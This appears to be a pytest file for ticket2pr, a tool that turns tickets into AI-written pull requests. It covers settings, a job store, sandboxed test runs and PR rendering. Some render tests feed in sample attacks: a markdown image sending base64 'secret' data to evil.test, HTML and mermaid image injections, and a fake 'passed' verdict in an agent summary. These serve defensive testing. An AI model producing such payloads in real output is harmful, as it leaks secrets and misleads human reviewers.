"""Domain models, configuration, job store, verification and rendering."""

from __future__ import annotations

import subprocess
import sys
import threading
from collections.abc import Iterator
from pathlib import Path

import pytest
from pydantic import ValidationError

from conftest import git
from ticket2pr import render
from ticket2pr.config import Settings, secret_env_names
from ticket2pr.domain import (
    AgentOutcome,
    AgentResult,
    ChangeSet,
    Job,
    JobStatus,
    PullRequest,
    TestReport,
    Ticket,
    Usage,
    is_ticket_key,
)
from ticket2pr.store import JobStore
from ticket2pr.trackers import adf
from ticket2pr.verify import detect_test_command, run_tests

# ── domain ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("key", "valid"),
    [("PROJ-1", True), ("A1_B-42", True), ("proj-1", False), ("PROJ-0", False), ("PROJ", False)],
)
def test_ticket_keys(key: str, valid: bool) -> None:
    assert is_ticket_key(key) is valid


def test_ticket_rejects_bad_key() -> None:
    with pytest.raises(ValidationError):
        Ticket(key="nope", title="x")


def test_usage_addition_and_totals() -> None:
    total = Usage(input_tokens=1, output_tokens=2, cost_usd=0.5, turns=1) + Usage(
        cache_read_tokens=3, cache_creation_tokens=4, cost_usd=0.25, turns=2, duration_s=1.5
    )
    assert total.total_tokens == 10
    assert total.cost_usd == 0.75
    assert (total.turns, total.duration_s) == (3, 1.5)
    assert total.cost_capped is False
    assert (total + Usage(cost_capped=True)).cost_capped is True


# ── config ──────────────────────────────────────────────────────────────


def test_settings_from_env(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("T2P_REPOS", '{"PROJ": "acme/api"}')
    monkeypatch.setenv("T2P_JIRA_BASE_URL", "https://acme.atlassian.net/")
    monkeypatch.setenv("T2P_MAX_BUDGET_USD", "1.5")
    settings = Settings(_env_file=None)
    assert settings.repo_for("PROJ-3") == "acme/api"
    assert settings.repo_for("OTHER-3") is None
    assert settings.jira_base_url == "https://acme.atlassian.net"
    assert settings.max_budget_usd == 1.5
    # Relative data dirs are made absolute: workspaces are handed to git and subprocesses.
    assert settings.db_path == Path.cwd() / ".ticket2pr" / "jobs.sqlite3"
    assert settings.workspaces_dir == Path.cwd() / ".ticket2pr" / "workspaces"


def test_differently_cased_secrets_are_hidden_too(monkeypatch: pytest.MonkeyPatch) -> None:
    """Settings read ``t2p_github_token`` as well, so the agent must not see it either."""
    monkeypatch.setenv("t2p_github_token", "ghp_lowercase_secret")
    assert Settings(_env_file=None).github_token.get_secret_value() == "ghp_lowercase_secret"
    monkeypatch.setenv("anthropic_api_key", "sk-lowercase-secret")
    names = secret_env_names()
    assert "t2p_github_token" in names
    assert "anthropic_api_key" in names
    assert "ANTHROPIC_API_KEY" not in names  # Claude Code gets its key under this name


@pytest.mark.parametrize("repos", [{"proj": "acme/api"}, {"PROJ": "not-a-repo"}, {"PROJ": "a/b/c"}])
def test_settings_reject_bad_repo_mapping(repos: dict[str, str]) -> None:
    with pytest.raises(ValidationError):
        Settings(repos=repos, _env_file=None)


def test_derived_paths_follow_copies() -> None:
    settings = Settings(data_dir=Path("/a"), _env_file=None)
    assert settings.db_path == Path("/a/jobs.sqlite3")
    copy = settings.model_copy(update={"data_dir": Path("/b")})
    assert copy.db_path == Path("/b/jobs.sqlite3")
    assert copy.workspaces_dir == Path("/b/workspaces")


def test_anthropic_key_is_read_with_or_without_prefix(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
    env_file = tmp_path / ".env"
    env_file.write_text("ANTHROPIC_API_KEY=sk-ant-from-dotenv\n")
    settings = Settings(_env_file=env_file)
    assert settings.anthropic_api_key.get_secret_value() == "sk-ant-from-dotenv"
    monkeypatch.setenv("T2P_ANTHROPIC_API_KEY", "sk-ant-prefixed")
    prefixed = Settings(_env_file=None)
    assert prefixed.anthropic_api_key.get_secret_value() == "sk-ant-prefixed"


def test_one_worker_without_sandbox() -> None:
    assert Settings(sandbox=True, workers=4, _env_file=None).workers == 4
    assert Settings(sandbox=False, workers=4, _env_file=None).workers == 1


@pytest.mark.parametrize("owner", ["bad owner", "-dash", "x" * 40])
def test_settings_reject_bad_fork_owner(owner: str) -> None:
    with pytest.raises(ValidationError):
        Settings(fork_owner=owner, _env_file=None)


def test_settings_reject_non_positive_budget() -> None:
    with pytest.raises(ValidationError):
        Settings(max_budget_usd=0, _env_file=None)


# ── store ───────────────────────────────────────────────────────────────


def test_store_claim_is_exclusive_per_ticket(tmp_path: Path) -> None:
    with JobStore(tmp_path / "db" / "jobs.sqlite3") as store:
        first = store.claim("PROJ-1", "acme/api")
        assert first is not None
        assert first.status is JobStatus.QUEUED
        assert store.claim("PROJ-1", None) is None  # queued job blocks duplicates
        assert store.claim("PROJ-2", None) is not None

        first.status = JobStatus.SUCCEEDED
        store.save(first)
        assert store.claim("PROJ-1", None) is not None  # finished jobs do not


@pytest.fixture
def memory_store() -> Iterator[JobStore]:
    with JobStore(":memory:") as store:
        yield store


def test_store_claim_under_concurrency(memory_store: JobStore) -> None:
    store = memory_store
    results: list[Job | None] = []

    def claim() -> None:
        results.append(store.claim("PROJ-1", None))

    threads = [threading.Thread(target=claim) for _ in range(8)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()
    assert sum(job is not None for job in results) == 1


def test_store_round_trip_and_listing(memory_store: JobStore) -> None:
    store = memory_store
    job = store.claim("PROJ-1", "acme/api")
    assert job is not None
    job.status = JobStatus.NEEDS_REVIEW
    job.usage = Usage(input_tokens=5, cost_usd=0.1)
    job.tests_passed = False
    job.pr_url = "https://x.test/pr/1"
    store.save(job)
    loaded = store.get(job.id or 0)
    assert loaded is not None
    assert loaded.usage == job.usage
    assert loaded.tests_passed is False
    assert store.get(999) is None

    store.claim("PROJ-2", None)
    assert [j.ticket_key for j in store.list()] == ["PROJ-2", "PROJ-1"]
    assert [j.ticket_key for j in store.list(status=JobStatus.NEEDS_REVIEW)] == ["PROJ-1"]
    assert len(store.list(limit=1)) == 1


def test_store_save_requires_id(memory_store: JobStore) -> None:
    with pytest.raises(ValueError, match="persisted"):
        memory_store.save(Job(ticket_key="PROJ-1"))


def test_store_fail_interrupted(memory_store: JobStore) -> None:
    store = memory_store
    running = store.claim("PROJ-1", None)
    assert running is not None
    running.status = JobStatus.RUNNING
    store.save(running)
    store.claim("PROJ-2", None)
    assert store.fail_interrupted() == 1  # queued jobs are re-enqueued, not failed
    statuses = {job.ticket_key: job.status for job in store.list()}
    assert statuses == {"PROJ-1": JobStatus.FAILED, "PROJ-2": JobStatus.QUEUED}


# ── verify ──────────────────────────────────────────────────────────────


@pytest.mark.parametrize(
    ("files", "expected"),
    [
        ({"package.json": '{"scripts": {"test": "jest"}}'}, "npm test --silent"),
        ({"package.json": '{"scripts": {}}'}, None),
        ({"package.json": "not json"}, None),
        ({"package.json": "[1]"}, None),
        (
            {"package.json": '{"scripts": {"test": "echo no test specified && exit 1"}}'},
            None,
        ),
        ({"pyproject.toml": "", "tests/test_a.py": ""}, "python3 -m pytest -q"),
        ({"setup.cfg": "", "test_x.py": ""}, "python3 -m pytest -q"),
        ({"setup.py": "", "x_test.py": ""}, "python3 -m pytest -q"),
        ({"pyproject.toml": ""}, None),
        ({"go.mod": ""}, "go test ./..."),
        ({"Cargo.toml": ""}, "cargo test --quiet"),
        ({"Makefile": "build:\n\ttrue\ntest:\n\ttrue\n"}, "make test"),
        ({"Makefile": "build:\n\ttrue\n"}, None),
        ({}, None),
    ],
)
def test_detect_test_command(tmp_path: Path, files: dict[str, str], expected: str | None) -> None:
    for name, content in files.items():
        (tmp_path / name).parent.mkdir(parents=True, exist_ok=True)
        (tmp_path / name).write_text(content)
    assert detect_test_command(tmp_path) == expected


async def test_run_tests_pass_fail_and_missing(tmp_path: Path) -> None:
    passed = await run_tests("echo ok", tmp_path, timeout_s=10, sandbox=None)
    assert passed.passed
    assert passed.exit_code == 0
    assert "ok" in passed.output_tail

    failed = await run_tests("echo boom >&2; exit 3", tmp_path, timeout_s=10, sandbox=None)
    assert not failed.passed
    assert failed.exit_code == 3
    assert "boom" in failed.output_tail

    missing = await run_tests(None, tmp_path, timeout_s=10, sandbox=None)
    assert not missing.ran
    assert not missing.passed


async def test_run_tests_hides_secrets(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("T2P_GITHUB_TOKEN", "leak-me")
    monkeypatch.setenv("VIRTUAL_ENV", "/opt/ticket2pr-venv")
    report = await run_tests("env", tmp_path, timeout_s=10, sandbox=None)
    assert "leak-me" not in report.output_tail
    assert "ticket2pr-venv" not in report.output_tail  # the repo brings its own toolchain
    assert "CI=true" in report.output_tail


async def test_unsandboxed_runs_get_a_fresh_home(tmp_path: Path) -> None:
    """What one job leaves in $HOME or $TMPDIR is gone for the next one."""
    plant = 'echo planted > "$HOME/.npmrc"; echo x > "$TMPDIR/x"'
    await run_tests(plant, tmp_path, timeout_s=10, sandbox=None)
    report = await run_tests(
        'ls -A "$HOME"; echo "$PYTHONNOUSERSITE"', tmp_path, timeout_s=10, sandbox=None
    )
    assert report.output_tail == "1\n"


async def test_versioned_builds_work_without_git_metadata(tmp_path: Path) -> None:
    report = await run_tests(
        'echo "$SETUPTOOLS_SCM_PRETEND_VERSION"', tmp_path, timeout_s=10, sandbox=None
    )
    assert report.output_tail == "0.0.0\n"


async def test_run_tests_keep_version_manager_homes(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    monkeypatch.setenv("RUSTUP_HOME", str(tmp_path))
    monkeypatch.setenv("CARGO_HOME", str(tmp_path / "missing"))
    report = await run_tests(
        'echo "$RUSTUP_HOME|$CARGO_HOME"', tmp_path, timeout_s=10, sandbox=None
    )
    assert report.output_tail == f"{tmp_path}|\n"


async def test_run_tests_never_climb_into_an_enclosing_repository(tmp_path: Path) -> None:
    git(tmp_path, "init", "-q")  # e.g. a data dir inside the operator's checkout
    workspace = tmp_path / "data" / "work"
    workspace.mkdir(parents=True)
    report = await run_tests("git rev-parse --show-toplevel", workspace, timeout_s=10, sandbox=None)
    assert not report.passed, report.output_tail


async def test_run_tests_timeout_kills_process_group(tmp_path: Path) -> None:
    report = await run_tests(
        "sleep 30 & echo $! > bg.pid; sleep 30", tmp_path, timeout_s=0.3, sandbox=None
    )
    pid = int((tmp_path / "bg.pid").read_text())
    assert not Path(f"/proc/{pid}").exists() or "Z" in Path(f"/proc/{pid}/stat").read_text()
    assert not report.passed
    assert report.exit_code is None
    assert "Timed out" in report.output_tail


async def test_run_tests_does_not_wait_for_leftover_children(tmp_path: Path) -> None:
    """A suite that exits but leaves a child holding the pipe is judged by its exit code."""
    report = await run_tests("sleep 30 & echo ok; exit 0", tmp_path, timeout_s=10, sandbox=None)
    assert report.passed
    assert report.output_tail == "ok\n"
    assert report.duration_s < 5


async def test_run_tests_reports_only_the_tail(tmp_path: Path) -> None:
    report = await run_tests(
        "head -c 100000 /dev/zero | tr '\\0' x; echo END", tmp_path, timeout_s=10, sandbox=None
    )
    assert len(report.output_tail) == 8_000
    assert report.output_tail.endswith("xEND\n")


# ── render ──────────────────────────────────────────────────────────────

TICKET = Ticket(key="PROJ-1", title="Fix", url="https://acme.atlassian.net/browse/PROJ-1")
PR = PullRequest(number=1, url="https://x.test/pr/1")
USAGE = Usage(input_tokens=1000, output_tokens=200, cache_read_tokens=50, cost_usd=1.234, turns=3)


def test_commit_message_and_title() -> None:
    assert render.commit_message(TICKET).splitlines()[0] == "PROJ-1: Fix"
    assert "Ticket: https://acme" in render.commit_message(TICKET)
    assert "Ticket:" not in render.commit_message(Ticket(key="PROJ-1", title="x"))
    assert render.pr_title(TICKET) == "[PROJ-1] Fix"


def test_pr_body_contents() -> None:
    body = render.pr_body(
        ticket=TICKET,
        agent=AgentResult(outcome=AgentOutcome.COMPLETED, summary="Did it"),
        usage=USAGE,
        changes=ChangeSet(files=("a.py", "b.py"), insertions=10, deletions=2),
        tests=TestReport(command="pytest", passed=False, output_tail="E  ``` assert", exit_code=1),
        model="claude-opus-5-5",
        excluded=(".env",),
    )
    assert "Resolves [PROJ-1](https://acme.atlassian.net/browse/PROJ-1): Fix" in body
    assert "2 file(s), +10 / -2" in body
    assert "| `claude-opus-5-5` | $1.23 |" in body
    assert "❌ failed" in body
    assert "````\nE  ``` assert\n````" in body  # fence outgrows backticks in the output
    assert "Not committed (protected path): ` .env `" in body


def test_pr_body_keeps_agent_text_inert() -> None:
    """No image or HTML from the agent: GitHub would fetch it for every viewer."""
    summary = "## Summary\n![ci](https://evil.test/b.svg?d=c2VjcmV0)\n<img src=x>\nFine."
    body = render.pr_body(
        ticket=TICKET,
        agent=AgentResult(
            outcome=AgentOutcome.COMPLETED, summary=summary, denied_actions=("Bash: a`b",)
        ),
        usage=USAGE,
        changes=ChangeSet(files=("a.py",)),
        tests=TestReport(command="pytest", passed=True),
        model="m",
    )
    assert "## Summary\n!\\[ci](https://evil.test/" in body
    assert "&lt;img src=x>" in body
    assert "<img" not in body
    assert "- Blocked: `` Bash: a`b ``" in body


def test_pr_body_title_cannot_use_a_reference_from_the_summary() -> None:
    body = render.pr_body(
        ticket=Ticket(key="PROJ-1", title="Fix ![s][s] <img src=x>"),
        agent=AgentResult(outcome=AgentOutcome.COMPLETED, summary="Done.\n\n[s]: https://e.test/x"),
        usage=USAGE,
        changes=ChangeSet(files=("a.py",)),
        tests=TestReport(command="pytest", passed=True),
        model="m",
    )
    assert "Fix !\\[s]\\[s] &lt;img src=x>" in body
    assert "\n\\[s]: https://e.test/x" in body


def test_inert_text_mentions_and_references_nobody() -> None:
    summary = "Ping @acme/everyone and @bob. Fixes #12, closes owner/repo#40.\n\n## Notes"
    body = render.pr_body(
        ticket=TICKET,
        agent=AgentResult(outcome=AgentOutcome.COMPLETED, summary=summary),
        usage=USAGE,
        changes=ChangeSet(files=("a.py",)),
        tests=TestReport(command="pytest", passed=True),
        model="m",
    )
    for reference in ("@acme/everyone", "@bob", "#12", "repo#40"):
        assert reference not in body
    assert "@\u200bbob" in body
    assert "\n## Notes" in body  # headings still render


def test_inert_text_cannot_unescape_a_link() -> None:
    body = render.pr_body(
        ticket=TICKET,
        agent=AgentResult(outcome=AgentOutcome.COMPLETED, summary="see \\[log](https://e.test)"),
        usage=USAGE,
        changes=ChangeSet(files=("a.py",)),
        tests=TestReport(command="pytest", passed=True),
        model="m",
    )
    assert "see \\\\\\[log](https://e.test)" in body  # escaped backslash, escaped bracket


def test_pr_body_without_tests_or_summary() -> None:
    body = render.pr_body(
        ticket=Ticket(key="PROJ-1", title="Fix"),
        agent=AgentResult(outcome=AgentOutcome.COMPLETED),
        usage=Usage(),
        changes=ChangeSet(files=("a.py",)),
        tests=TestReport(command=None, passed=False),
        model="m",
    )
    assert "not** verified" in body
    assert "did not provide a summary" in body
    assert "Guardrail events" not in body


@pytest.mark.parametrize(
    ("tests", "expected"),
    [
        (TestReport(command=None, passed=False), "No tests were run"),
        (TestReport(command="pytest", passed=True), "Tests pass"),
        (TestReport(command="pytest", passed=False), "Tests fail"),
    ],
)
def test_tracker_comment_with_pr(tests: TestReport, expected: str) -> None:
    text = render.tracker_comment(published=(PR, tests), usage=USAGE)
    assert expected in text
    # Only the cost: tokens and turns are numbers the agent could steer for the reporter.
    assert "1,250" not in text
    assert "turn" not in text
    assert "$1.23" in text
    assert "opened a pull request" in text


def test_tracker_comment_names_drafts_and_capped_costs() -> None:
    draft = PullRequest(number=1, url="https://x.test/pr/1", draft=True)
    capped = Usage(cost_usd=2.0, cost_capped=True)
    text = render.tracker_comment(
        published=(draft, TestReport(command="pytest", passed=False)), usage=capped
    )
    assert "opened a draft pull request" in text
    assert "≤ $2.00" in text


def test_tracker_comment_on_failure() -> None:
    text = render.tracker_comment(published=None, usage=USAGE, error="boom")
    assert "turn" not in text
    assert "could not open a pull request: ` boom `" in text  # inert: agent text can be in it
    assert "unknown error" in render.tracker_comment(published=None, usage=USAGE)
    link = render.tracker_comment(published=None, usage=USAGE, error="a`[x](https://e.test)")
    assert adf.from_markdown(link)["content"][0]["content"][1] == {
        "type": "text",
        "text": " a'[x](https://e.test) ",
        "marks": [{"type": "code"}],
    }


def test_configuration_docs_are_up_to_date() -> None:
    script = Path(__file__).resolve().parent.parent / "scripts" / "gen_config_docs.py"
    result = subprocess.run([sys.executable, str(script), "--check"], check=False)
    assert result.returncode == 0, "run: uv run python scripts/gen_config_docs.py"


def test_agent_summary_comes_last_and_opens_no_fence() -> None:
    """A fake verdict or an unclosed fence in the summary cannot hide ticket2pr's sections."""
    summary = "## Verification\n\n✅ passed\n\n> ```mermaid\nA@{ img: 'https://e.test' }"
    body = render.pr_body(
        ticket=TICKET,
        agent=AgentResult(outcome=AgentOutcome.COMPLETED, summary=summary),
        usage=USAGE,
        changes=ChangeSet(files=("a.py",)),
        tests=TestReport(command="pytest", passed=False, output_tail="boom", exit_code=1),
        model="m",
    )
    assert body.index("❌ failed") < body.index("## Agent summary") < body.index("✅ passed")
    assert "> \\`\\`\\`mermaid" in body
    assert "```mermaid" not in body
